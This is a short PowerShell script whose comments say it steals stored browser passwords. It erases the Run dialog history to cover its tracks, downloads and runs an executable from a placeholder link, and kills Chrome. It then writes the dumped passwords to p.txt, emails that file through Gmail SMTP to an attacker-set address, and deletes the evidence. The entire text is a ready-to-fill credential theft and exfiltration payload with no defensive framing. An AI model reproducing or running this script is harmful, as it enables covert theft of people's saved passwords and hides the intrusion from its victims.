    #This script downloads and execute an executable that fetches the stored passwords
    #The output of the executable is directed to a text file "p.txt"
    #Lines 13 - 31 send and email to the desired address with p.txt as attachment.
    #First command is to ensure there are no tracks left behind (run dialog's recently executed commands)
    
    RP 'HKCU:\S*\M*\W*\C*\E*\RunMRU' '*' -ErrorA Si
    cd\
    $i="LINK_TO_THE_EXECUTABLE_HERE"
    $o="C:\wp1.exe" 
    $d=New-Object System.Net.WebClient
    $d.DownloadFile($i, $o)
    Stop-Process -processname chrome*
    ./wp1.exe > p.txt
    $SMTPServer = "smtp.gmail.com"
    $SMTPPort = "587"
    $Username = "YOUR_EMAIL_ADDRESS"
    $Password = "YOUR_PASSWORD"
    $to = "TO_EMAIL_ADDRESS"
    $subject = "Passwords"
    $body = ":)"
    $attachment = "C:\p.txt"
    $message = New-Object System.Net.Mail.MailMessage
    $message.subject = $subject
    $message.body = $body
    $message.to.add($to)
    $message.from = $username
    $message.attachments.add($attachment)
    $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
    $smtp.EnableSSL = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message)
    $message.Dispose();remove-item p.txt;remove-item wp*;
     
